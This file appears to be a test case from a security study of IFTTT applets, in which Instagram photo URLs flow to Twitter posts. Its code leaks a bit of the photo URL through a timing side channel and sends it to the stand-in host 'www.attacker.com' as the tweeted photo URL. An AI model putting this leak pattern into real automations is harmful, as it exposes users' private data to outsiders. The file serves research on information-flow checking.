//Maker: djuiceman
//Link2Applet: https://ifttt.com/applets/103249p-tweet-your-instagrams-as-native-photos-on-twitter
//Title of Applet:  Tweet your Instagrams as native photos on Twitter
//Trigger service: Instagram
//Action service: Twitter
//Policy/Presence: Confidentiality of user Photos / NO 


url = lbl("Instagram.anyNewPhotoByYou.Url");
var res = "";
var stime = Date.now();
var a = lbl(1); 
if (url.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 
  
attack = urll("www.attacker.com?" + res);
sink('Twitter.postNewTweetWithImage' , 'setTweet', 'My Instagram Photo');
sink('Twitter.postNewTweetWithImage',  'setPhotoUrl', attack);

